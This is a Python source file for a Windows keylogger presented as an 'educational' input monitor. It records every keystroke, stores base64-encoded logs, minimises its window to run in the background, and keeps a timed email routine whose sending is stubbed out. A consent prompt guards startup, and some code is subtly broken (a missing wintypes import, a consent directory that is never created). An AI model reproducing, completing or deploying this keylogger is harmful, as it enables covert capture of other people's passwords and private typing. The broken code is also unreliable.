import os
import time
import base64
import threading
import ctypes
import smtplib
import win32api
import win32con
import win32gui
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime

# Global variables
MONITORING_ACTIVE = True
KEYS_BUFFER = []
MAIL_TIMER = None
MAIL_INTERVAL = 30  # seconds

class IO:
    @staticmethod
    def get_app_data_path():
        return os.path.join(os.getenv('APPDATA'), '')
    
    @staticmethod
    def get_our_path(append_separator=False):
        path = os.path.join(IO.get_app_data_path(), "InputMonitor")
        if append_separator:
            path = os.path.join(path, '')
        return path
    
    @staticmethod
    def get_local_path(append_separator=False):
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
        if append_separator:
            path = os.path.join(path, '')
        return path
    
    @staticmethod
    def make_dir(path):
        os.makedirs(path, exist_ok=True)
        return True

class Helper:
    @staticmethod
    def get_datetime_string():
        now = datetime.now()
        return now.strftime("%d-%m-%Y %H:%M:%S")
    
    @staticmethod
    def get_datetime_filename():
        now = datetime.now()
        return now.strftime("%d-%m-%Y_%H-%M-%S")

def encode_base64(data):
    return base64.b64encode(data.encode()).decode()

def decode_base64(data):
    return base64.b64decode(data.encode()).decode()

class KeyLogger:
    @staticmethod
    def on_press(key):
        global KEYS_BUFFER
        
        if not MONITORING_ACTIVE:
            return
        
        try:
            # Handle normal key presses
            key_char = key.char
            KEYS_BUFFER.append(key_char)
        except AttributeError:
            # Handle special keys
            special_key = str(key).replace("Key.", "")
            if special_key == "space":
                KEYS_BUFFER.append(" ")
            elif special_key == "enter":
                KEYS_BUFFER.append("[ENTER]\n")
            elif special_key in ["shift", "ctrl", "alt"]:
                KEYS_BUFFER.append(f"[{special_key.upper()}]")
            elif special_key == "backspace":
                KEYS_BUFFER.append("[BACKSPACE]")
            else:
                KEYS_BUFFER.append(f"[{special_key.upper()}]")
        
        # Write to log file if buffer is big enough
        if len(KEYS_BUFFER) >= 50:
            KeyLogger.write_to_log_file()
    
    @staticmethod
    def write_to_log_file():
        global KEYS_BUFFER
        
        if not KEYS_BUFFER:
            return
        
        # Create the log filename based on current time
        log_filename = Helper.get_datetime_filename() + ".log"
        log_path = IO.get_local_path(True) + log_filename
        
        # Create the content to log
        content = ''.join(KEYS_BUFFER)
        encoded_content = encode_base64(content)
        
        # Write to encoded log file
        with open(log_path, 'w') as log_file:
            log_file.write(encoded_content)
        
        # Also create a decoded version for easier viewing (for educational purposes)
        with open(log_path + "_decoded.txt", 'w') as decoded_file:
            decoded_file.write(content)
        
        # Clear the buffer
        KEYS_BUFFER.clear()

def send_mail():
    # This would implement the email sending functionality
    # For educational purposes, we'll just log that mail would be sent
    print("Mail would be sent now (functionality disabled in educational version)")
    KeyLogger.write_to_log_file()  # Make sure to flush buffer before sending
    
    # Restart timer
    schedule_mail()

def schedule_mail():
    global MAIL_TIMER
    MAIL_TIMER = threading.Timer(MAIL_INTERVAL, send_mail)
    MAIL_TIMER.daemon = True
    MAIL_TIMER.start()

def toggle_monitoring():
    global MONITORING_ACTIVE
    MONITORING_ACTIVE = not MONITORING_ACTIVE
    status = "RESUMED" if MONITORING_ACTIVE else "PAUSED"
    print(f"Monitoring {status}")

def install_hook():
    # Set up keyboard listener
    listener = keyboard.Listener(on_press=KeyLogger.on_press)
    listener.daemon = True
    listener.start()
    return listener

def register_hotkeys(window_class_name="InputMonitorPythonClass"):
    # Create a window to receive hotkey events
    wc = win32gui.WNDCLASS()
    wc.lpszClassName = window_class_name
    wc.lpfnWndProc = hotkey_handler
    wc.hInstance = win32api.GetModuleHandle(None)
    
    # Register the window class
    class_atom = win32gui.RegisterClass(wc)
    
    # Create the window
    hwnd = win32gui.CreateWindow(
        class_atom, 
        "InputMonitor Hotkeys",
        0, 0, 0, 0, 0,
        0,  # HWND_MESSAGE
        0, win32api.GetModuleHandle(None), None
    )
    
    # Register hotkeys: CTRL+SHIFT+E to exit, CTRL+SHIFT+P to pause/resume
    win32api.RegisterHotKey(hwnd, 1, win32con.MOD_CONTROL | win32con.MOD_SHIFT, ord('E'))
    win32api.RegisterHotKey(hwnd, 2, win32con.MOD_CONTROL | win32con.MOD_SHIFT, ord('P'))
    
    return hwnd

def hotkey_handler(hwnd, msg, wparam, lparam):
    if msg == win32con.WM_HOTKEY:
        if wparam == 1:  # CTRL+SHIFT+E to exit
            win32gui.PostQuitMessage(0)
        elif wparam == 2:  # CTRL+SHIFT+P to pause/resume
            toggle_monitoring()
    return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

def is_consent_given():
    # Check for a consent file or create one if it doesn't exist
    consent_path = os.path.join(IO.get_our_path(True), "consent.txt")
    
    if os.path.exists(consent_path):
        # Consent already exists
        return True
    
    # No consent file found, ask for consent
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=====================================================")
    print("           EDUCATIONAL INPUT ACTIVITY MONITOR         ")
    print("=====================================================")
    print()
    print("This application monitors keyboard activity for:")
    print("- Educational demonstration of Windows hook API")
    print("- Self-monitoring for productivity analysis")
    print("- Understanding computer security principles")
    print()
    print("All data is kept locally by default and only sent via email")
    print("with explicit configuration and consent.")
    print()
    print("NOTE: Using this software to monitor others without")
    print("their knowledge and consent is illegal and unethical.")
    print()
    
    response = input("Do you consent to monitoring your own inputs? (y/n): ")
    
    if response.lower() == 'y':
        # Save consent
        with open(consent_path, 'w') as consent_file:
            consent_file.write(f"Consent given on: {Helper.get_datetime_string()}\n")
            consent_file.write("This file indicates user consent for self-monitoring.\n")
        return True
    
    return False

def print_usage_information():
    print("=====================================================")
    print("           INPUT ACTIVITY MONITOR STARTED            ")
    print("=====================================================")
    print("- The application is now running in the background")
    print("- Press CTRL+SHIFT+P to pause/resume monitoring")
    print("- Press CTRL+SHIFT+E to exit the application")
    print(f"- Logs are stored in: {IO.get_local_path()}")
    print()
    print("This window will minimize in 10 seconds...")
    
    # Wait for 10 seconds
    time.sleep(10)
    
    # Minimize the console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # SW_MINIMIZE = 6

def main():
    # Check for user consent
    if not is_consent_given():
        print("Consent not given. Application will exit.")
        input("Press Enter to continue...")
        return
    
    # Create logs directory
    IO.make_dir(IO.get_local_path())
    
    # Create a config file to use local path
    with open(os.path.join(IO.get_local_path(), "config.txt"), 'w') as config_file:
        config_file.write("UseLocalPath=true\n")
    
    # Show usage information
    print_usage_information()
    
    # Install keyboard hook
    listener = install_hook()
    
    # Register hotkeys for control
    hwnd = register_hotkeys()
    
    # Set mail timer
    schedule_mail()
    
    # Message loop
    msg = ctypes.wintypes.MSG()
    while win32gui.GetMessage(msg, None, 0, 0) != 0:
        win32gui.TranslateMessage(msg)
        win32gui.DispatchMessage(msg)
    
    # Clean up
    if MAIL_TIMER:
        MAIL_TIMER.cancel()
    listener.stop()

if __name__ == "__main__":
    main()
